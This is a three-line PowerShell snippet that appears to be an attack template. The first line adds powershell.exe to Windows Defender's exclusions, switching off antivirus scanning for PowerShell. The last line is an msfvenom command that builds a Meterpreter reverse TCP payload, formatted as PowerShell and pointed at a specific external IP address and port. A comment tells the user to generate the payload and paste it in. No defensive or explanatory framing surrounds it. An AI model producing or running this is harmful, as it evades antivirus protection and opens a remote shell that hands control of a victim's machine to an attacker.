Add-MpPreference -ExclusionProcess powershell.exe
#Generate Your Payload With This Command And Put It Here.
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=45.79.121.251 LPORT=910 -f psh